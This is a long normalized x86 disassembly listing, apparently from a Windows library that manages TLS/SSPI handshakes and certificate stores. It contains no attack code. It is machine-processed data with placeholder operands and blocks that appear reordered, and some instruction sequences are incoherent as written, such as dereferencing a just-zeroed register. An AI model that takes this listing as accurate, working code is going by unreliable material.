mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
lea edi [ esi + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x4 ] edx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] 0x1
mov [ edi ] eax
mov [ edi + 0x4 ] eax
cmp ecx eax
je r-xdata
xor ecx ecx
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov edx [ esi + 0x4 ]
lea eax [ ebp - 0x20 ]
push eax
push edi
push 0x0
push 0x0
lea ecx [ ebp - 0x58 ]
push ecx
push 0x0
push 0x1
push r--data
mov [ ebp - 0x38 ] 0x10
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] 0x2
mov edx [ edx + 0x4 ]
push 0x0
call edx
test eax eax
je r-xdata
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x54 ] 0x1
mov [ ebp - 0x50 ] ecx
push 0x38
push eax
lea eax [ ebp - 0x58 ]
mov ebx ecx
push eax
mov [ ebp - 0x10 ] ebx
call sub_10018220
add esp 0xc
mov [ ebp - 0x58 ] 0x4
test ebx ebx
je r-xdata
push 0x8
call sub_10012ca7
mov edi eax
add esp 0x4
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x4 ] 0x1
test edi edi
je r-xdata
call [ GetLastError@IAT ]
push r--data
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] 0x20004
call sub_10013848
xor edi edi
mov ecx [ esi + 0x4 ]
push 0x0
push 0x0
push 0x0
push 0x1
push 0x2
mov [ edi + 0x4 ] ecx
call [ CertOpenStore@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
mov [ esi + 0x18 ] edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push r--data
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x14 ] 0x20001
call sub_10013848
sub_10008350
push ebp
mov ebp esp
push 0xffffffff
push sub_1001bf88
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ ecx + 0x10 ]
push eax
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100083d0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
mov [ esi ] r--data
call sub_10012e64
add esp 0x4
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10008420
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
mov [ esi ] r--data
je r-xdata
mov eax [ esi + 0x4 ]
push eax
call sub_10012c4b
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10008470
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ esi + 0x4 ] ebx
jbe r-xdata
pop ebx
pop ebp
retn 0x8
push edi
xor edi edi
mov edi edi
inc ebx
add edi 0xc
cmp ebx [ esi + 0x4 ]
jb r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edi + 0x8 ]
add eax edi
test ecx ecx
je r-xdata
pop edi
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
push ecx
mov ecx [ eax + 0x10 ]
call ecx
sub_100084b0
push ebp
mov ebp esp
push ecx
mov eax [ edi + 0x4 ]
mov edx [ eax + 0x1c ]
push esi
lea ecx [ edi + 0xc ]
push ecx
push 0x4
lea esi [ edi + 0x20 ]
push esi
call edx
test eax eax
jne r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ ecx + 0x1c ]
lea edx [ ebp - 0x4 ]
push edx
push 0x53
push esi
call eax
test eax eax
jne r-xdata
mov eax 0x1
mov [ edi + 0x44 ] eax
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
mov eax [ edi + 0x8 ]
call sub_10008160
mov ecx [ ebp - 0x4 ]
push ecx
mov esi eax
call [ CertFreeCertificateContext@IAT ]
test esi esi
jne r-xdata
sub_10008520
mov edx [ ecx + 0x4 ]
xor eax eax
push esi
test edx edx
je r-xdata
xor eax eax
pop esi
retn
mov esi [ ecx + 0x8 ]
lea ecx [ esi + 0x4 ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax * 4 ]
pop esi
retn
inc eax
add ecx 0xc
cmp eax edx
jb r-xdata
cmp [ ecx ] edi
je r-xdata
sub_10008550
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c4e3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea eax [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x24 ]
push eax
call edx
cmp [ esi + 0x24 ] 0x0
je r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x3c ] 0xf
mov [ esi + 0x38 ] 0x0
mov [ esi + 0x28 ] 0x0
mov [ esi ] r--data
je r-xdata
mov eax [ esi + 0x28 ]
push eax
call sub_10012c4b
add esp 0x4
cmp [ esi + 0x3c ] 0x10
jb r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100085f0
push ebp
mov ebp esp
push 0x18
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
xor eax eax
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp + 0xc ]
mov [ eax ] r--data
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
xor ecx ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
pop ebp
retn 0x8
mov ecx [ esi ]
mov [ eax + 0xc ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x10 ] edx
mov ecx [ esi + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn 0x8
sub_10008650
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
cmp eax 0x90312
jne r-xdata
cmp eax 0x80090318
jne r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
xor eax eax
test edx edx
je r-xdata
test eax eax
jne r-xdata
mov eax [ edx ]
test eax eax
je r-xdata
push 0x0
push ebx
call sub_10008470
mov edi [ esi + 0x8 ]
lea ecx [ edi + 0x4 ]
cmp eax 0x90313
jne r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
push ebx
call sub_10008470
push 0x18
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
push eax
mov eax [ edx + 0x8 ]
lea ecx [ ebx + 0x28 ]
call sub_10002a60
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov ebx [ ebx + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x8 ] ebx
xor ecx ecx
mov [ eax + 0x4 ] 0x2
pop edi
mov [ eax + 0xc ] ecx
pop esi
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
pop ebx
pop ebp
retn 0x4
lea eax [ eax + eax * 2 ]
lea edi [ edi + eax * 4 ]
test edi edi
jne r-xdata
inc eax
add ecx 0xc
cmp eax edx
jb r-xdata
cmp eax 0x90314
jne r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0x5
mov ecx esi
call sub_10008520
test eax eax
je r-xdata
mov edx [ edi + 0x4 ]
xor eax eax
test edx edx
je r-xdata
mov esi [ edi + 0x8 ]
lea edx [ esi + 0x4 ]
lea esp [ esp ]
mov ebx [ ebx + 0x4 ]
mov [ eax + 0x8 ] ebx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x1
pop edi
mov [ eax + 0xc ] ecx
pop esi
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
pop ebx
pop ebp
retn 0x4
push edi
push ebx
call sub_10008470
push 0x1
mov esi edi
push ebx
call sub_100085f0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ecx ] 0x2
je r-xdata
jmp r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
mov edx [ ebx + 0x4 ]
mov ecx [ edx + 0x28 ]
push esi
lea eax [ ebx + 0x20 ]
push eax
call ecx
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov ecx [ edx + 0x28 ]
push esi
lea eax [ ebx + 0x20 ]
push eax
call ecx
push 0x0
push ebx
test eax eax
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x8 ]
push ecx
lea ecx [ ebx + 0x28 ]
call sub_10002a60
xor esi esi
mov esi [ edi + 0x8 ]
lea ecx [ esi + 0x4 ]
lea ecx [ eax + eax * 2 ]
lea eax [ esi + ecx * 4 ]
test eax eax
je r-xdata
inc eax
add edx 0xc
cmp eax ecx
jb r-xdata
mov edi 0x2
mov ecx esi
call sub_10008520
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
push 0x0
push ebx
call sub_10008470
call sub_10008470
mov edi ebx
call sub_100084b0
xor esi esi
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
lea eax [ eax + eax * 2 ]
lea esi [ esi + eax * 4 ]
jmp r-xdata
inc eax
add ecx 0xc
cmp eax edx
jb r-xdata
mov edx [ eax ]
mov eax [ eax + 0x8 ]
push edx
lea ecx [ ebx + 0x28 ]
call sub_10002a60
cmp [ edx ] 0x5
je r-xdata
jmp r-xdata
push eax
push ebx
call sub_10008470
mov edi ebx
call sub_100084b0
test eax eax
je r-xdata
push 0x2
push ebx
call sub_100085f0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push esi
push ebx
call sub_100085f0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push 0x18
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
push 0x0
push ebx
call sub_100085f0
push esi
push ebx
mov esi edi
mov [ ebp + 0x8 ] eax
call sub_10008470
mov edi ebx
call sub_100084b0
test eax eax
jne r-xdata
cmp [ ecx ] 0x2
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
push ebx
call sub_100085f0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_100088c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d280
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
mov esi ecx
mov eax [ esi + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x7c ] ecx
cmp edi eax
jbe r-xdata
xor eax eax
lea ecx [ ebp - 0x40 ]
push 0x30
push eax
mov edx ecx
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x80 ] eax
push edx
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] 0x4
mov [ ebp - 0x80 ] ecx
call sub_10018220
mov eax [ esi + 0xc ]
add eax edi
add eax [ esi + 0x10 ]
push eax
call sub_10012766
mov ecx [ ebp - 0x7c ]
mov ebx eax
mov eax [ esi + 0xc ]
push edi
mov [ ebp - 0x40 ] eax
add eax ebx
push ecx
push eax
mov [ ebp - 0x3c ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x34 ] edi
call sub_10018b70
mov eax [ esi + 0xc ]
mov edx [ esi + 0x10 ]
mov ecx [ esi + 0x4 ]
add esp 0x1c
add eax edi
xor edi edi
mov [ ebp - 0x28 ] edx
push edi
add eax ebx
lea edx [ ebp - 0x88 ]
push edx
mov [ ebp - 0x20 ] eax
push edi
lea eax [ esi + 0x20 ]
mov [ ebp - 0x24 ] 0x6
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x1c ] edi
mov ecx [ ecx + 0x18 ]
push eax
call ecx
test eax eax
je r-xdata
mov edx [ esi ]
push eax
mov eax [ edx + 0x8 ]
push ecx
mov ecx esi
call eax
mov ebx eax
mov edx [ ebx ]
mov eax [ edx + 0x4 ]
mov ecx ebx
call eax
cmp eax 0x2
jne r-xdata
mov esi [ ebp - 0x1c ]
add esi [ ebp - 0x28 ]
push 0x10
add esi [ ebp - 0x34 ]
add esi [ ebp - 0x40 ]
call sub_10012ca7
add esp 0x4
cmp eax edi
je r-xdata
push ebx
call sub_10012e64
push 0x18
call sub_10012ca7
add esp 0x8
cmp eax edi
je r-xdata
xor eax eax
mov [ ebp - 0x64 ] 0xf
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x78 ] al
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x14 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
sub edi eax
add eax [ ebp - 0x7c ]
push edi
push eax
mov ecx esi
call edx
mov esi eax
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
cmp eax 0x2
jne r-xdata
mov eax ebx
jmp r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] ebx
mov [ eax + 0xc ] esi
mov [ eax + 0x8 ] ebx
jmp r-xdata
mov esi [ esi + 0x4 ]
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x8 ] esi
mov [ eax + 0x4 ] 0x2
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
jmp r-xdata
mov edi 0xf
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx ]
mov edx [ eax + 0xc ]
mov ecx ebx
call edx
push eax
mov eax [ ebx ]
mov edx [ eax + 0x8 ]
mov ecx ebx
call edx
lea ecx [ ebp - 0x5c ]
call sub_10002a60
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov ecx esi
call edx
push eax
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
lea ecx [ ebp - 0x5c ]
call sub_10002a60
mov eax [ ebx ]
mov edx [ eax ]
push 0x1
mov ecx ebx
call edx
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
sub esp 0x1c
mov eax esp
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x7c ] esp
mov [ eax + 0x14 ] edi
push ecx
mov [ eax + 0x10 ] 0x0
or ecx 0xffffffff
xor ebx ebx
mov edi eax
mov [ eax ] 0x0
call sub_10004820
push ebx
call sub_10008ea0
cmp [ ebp - 0x48 ] 0x10
mov esi eax
jb r-xdata
mov eax [ ebx ]
mov edx [ eax ]
push 0x1
mov ecx ebx
call edx
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
mov eax esi
jmp r-xdata
mov edx [ ebp - 0x5c ]
push edx
call sub_10012c4b
add esp 0x4
sub_10008b40
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d248
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
xor ecx ecx
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x88 ] ecx
mov [ ebp - 0x84 ] ecx
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x88 ] ecx
mov [ ebp - 0x84 ] 0x4
mov [ ebp - 0x80 ] edx
mov [ ebp - 0x48 ] 0xf
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x5c ] cl
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebx + 0x28 ]
push edx
mov [ ebp - 0x8c ] ecx
call sub_10002a60
lea esp [ esp ]
push eax
push ecx
push esi
call sub_10018b70
mov edx [ ebx + 0x4 ]
add esp 0xc
push 0x0
push 0x0
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebx + 0x20 ]
mov [ ebp - 0x3c ] 0x1
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x38 ] esi
mov ecx [ edx + 0x14 ]
push eax
call ecx
test eax eax
jne r-xdata
mov ecx [ ecx ]
cmp eax 0x80090318
jne r-xdata
mov edx [ ebp - 0x84 ]
test edx edx
je r-xdata
cmp eax 0x90317
jne r-xdata
push esi
call sub_10012e64
sub esp 0x18
mov edi esp
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x7c ] esp
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
push eax
or ecx 0xffffffff
xor ebx ebx
mov [ edi ] 0x0
call sub_10004820
xor ecx ecx
cmp ecx [ ebp - 0x4c ]
sbb edx edx
inc edx
push edx
call sub_10008ea0
mov esi eax
jmp r-xdata
push esi
call sub_10012e64
push 0x18
call sub_10012ca7
add esp 0x8
test eax eax
je r-xdata
mov edi [ ebp - 0x80 ]
lea ecx [ edi + 0x4 ]
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x48 ] 0x10
jb r-xdata
xor esi esi
mov ebx [ ebx + 0x4 ]
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] 0x2
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov esi eax
jmp r-xdata
lea edx [ eax + eax * 2 ]
lea eax [ edi + edx * 4 ]
test eax eax
je r-xdata
inc eax
add ecx 0xc
cmp eax edx
jb r-xdata
push esi
call sub_10012e64
sub esp 0x18
mov edi esp
mov [ ebx + 0x48 ] 0x1
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x7c ] esp
push ecx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
or ecx 0xffffffff
xor ebx ebx
mov [ edi ] 0x0
call sub_10004820
push ebx
call sub_10008ea0
cmp [ ebp - 0x48 ] 0x10
mov esi eax
jb r-xdata
mov eax esi
mov eax [ ebp - 0x5c ]
push eax
mov ecx [ eax ]
mov eax [ eax + 0x8 ]
push ecx
lea ecx [ ebp - 0x5c ]
call sub_10002a60
mov edx [ ebp - 0x84 ]
xor eax eax
test edx edx
je r-xdata
cmp [ ecx ] 0x1
je r-xdata
mov edx [ ebp - 0x5c ]
push edx
jmp r-xdata
mov [ ebp - 0x64 ] 0xf
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x78 ] 0x0
mov esi [ ebp - 0x8c ]
lea edi [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x2
call sub_10005ef0
mov esi 0x10
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x64 ] esi
jb r-xdata
mov esi [ ebp - 0x80 ]
lea ecx [ esi + 0x4 ]
call sub_10012c4b
add esp 0x4
mov eax [ ebp - 0x7c ]
push eax
call sub_10012e64
sub esp 0x18
mov edi esp
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x7c ] esp
push ecx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
or ecx 0xffffffff
xor ebx ebx
mov [ edi ] 0x0
call sub_10004820
push ebx
call sub_10008ea0
mov edi eax
cmp [ ebp - 0x48 ] esi
jb r-xdata
mov edx [ ebp - 0x78 ]
push edx
call sub_10012c4b
add esp 0x4
lea edx [ eax + eax * 2 ]
lea eax [ esi + edx * 4 ]
test eax eax
je r-xdata
inc eax
add ecx 0xc
cmp eax edx
jb r-xdata
mov eax edi
jmp r-xdata
mov edx [ ebp - 0x5c ]
push edx
call sub_10012c4b
add esp 0x4
mov esi [ eax ]
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x64 ] 0xf
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x78 ] 0x0
call sub_10004db0
mov esi [ ebp - 0x8c ]
lea edi [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x1
call sub_10005ef0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x64 ] 0x10
jb r-xdata
cmp [ ecx ] 0x5
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x7c ]
push ecx
call sub_10012e64
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x78 ]
push eax
call sub_10012c4b
add esp 0x4
mov edi [ ebx + 0x38 ]
push edi
call sub_10012766
mov esi eax
mov eax [ ebp - 0x84 ]
lea eax [ eax + eax * 2 ]
add eax eax
add eax eax
push eax
lea ecx [ ebp - 0x40 ]
push 0x0
push ecx
mov [ ebp - 0x7c ] esi
call sub_10018220
mov ecx [ ebp - 0x8c ]
mov eax [ ebx + 0x38 ]
add esp 0x10
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
sub_10008ea0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d20e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x24
mov [ ebp - 0x4 ] ebx
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
xor esi esi
lea eax [ ebp + 0xc ]
push eax
or ecx 0xffffffff
lea edi [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10004820
lea edi [ esi + 0x4 ]
mov [ esi ] r--data
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
mov [ edi ] bl
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x4
lea edx [ ebp - 0x2c ]
mov [ esi + 0x20 ] ecx
push edx
or ecx 0xffffffff
call sub_10004820
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ecx [ ebp + 0xc ]
push ecx
call sub_10012c4b
add esp 0x4
xor eax eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x2c ] al
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
cmp [ ebp + 0x20 ] 0x10
jb r-xdata
sub_10008f80
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c148
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
mov edx [ eax + 0x8 ]
lea ecx [ esi + 0x8 ]
push ecx
call edx
mov edi [ esi + 0x18 ]
test edi edi
je r-xdata
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ edi ]
push 0x0
push eax
call [ CertCloseStore@IAT ]
push edi
call sub_10012c4b
add esp 0x4
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10009020
push esi
push 0x4c
mov esi ecx
call sub_10012ca7
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor eax eax
pop esi
retn
mov [ eax ] r--data
mov [ eax + 0x3c ] 0xf
mov [ eax + 0x38 ] ecx
mov [ eax + 0x28 ] cl
mov [ eax + 0x8 ] esi
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x44 ] ecx
mov [ eax + 0x48 ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax ] r--data
pop esi
retn
sub_10009080
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d1b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x7c ] ecx
xor ecx ecx
lea esi [ eax + 0x28 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x5c ] cl
push esi
or ecx 0xffffffff
xor ebx ebx
lea edi [ ebp - 0x5c ]
mov [ ebp - 0x9c ] eax
mov [ ebp - 0x48 ] 0xf
call sub_10004820
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x7c ]
push edx
mov ecx edi
mov [ ebp - 0x4 ] ebx
call sub_10002a60
mov [ ebp - 0x64 ] 0xf
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x78 ] bl
lea edi [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x1
call sub_10005ef0
mov esi 0x10
mov [ ebp - 0x4 ] bl
cmp [ ebp - 0x64 ] esi
jb r-xdata
mov eax 0x2
lea ecx [ ebp - 0xb4 ]
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] eax
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0xb0 ] eax
cmp [ ebp - 0x48 ] esi
jb r-xdata
mov eax [ ebp - 0x78 ]
push eax
call sub_10012c4b
add esp 0x4
lea eax [ ebp - 0x5c ]
mov [ ebp - 0xac ] eax
mov edx [ ebp - 0x5c ]
mov [ ebp - 0xac ] edx
jmp r-xdata
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x7c ] ebx
cmp [ esi + 0x24 ] ebx
je r-xdata
mov ecx [ ebp - 0x4c ]
lea edx [ ebp - 0x40 ]
push 0x30
mov eax edx
push ebx
mov [ ebp - 0x88 ] ebx
mov [ ebp - 0x84 ] ebx
mov [ ebp - 0x80 ] ebx
push eax
mov [ ebp - 0xb4 ] ecx
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xa0 ] ebx
mov [ ebp - 0x88 ] ebx
mov [ ebp - 0x84 ] 0x4
mov [ ebp - 0x80 ] edx
call sub_10018220
mov esi [ ebp - 0x9c ]
lea eax [ esi + 0x20 ]
add esp 0xc
cmp [ eax ] ebx
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x5c ]
push edx
call sub_10012c4b
add esp 0x4
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x14 ]
mov edi [ esi + 0x4 ]
push ebx
lea edx [ ebp - 0x98 ]
push edx
add ecx 0x8
neg eax
lea edx [ ebp - 0x88 ]
push edx
sbb eax eax
lea edx [ esi + 0x20 ]
push edx
mov edx [ ebp - 0x7c ]
and eax 0x2
push ebx
or eax 0x1011c
push eax
lea eax [ ebp - 0x94 ]
push eax
mov eax [ edi + 0xc ]
push edx
push ecx
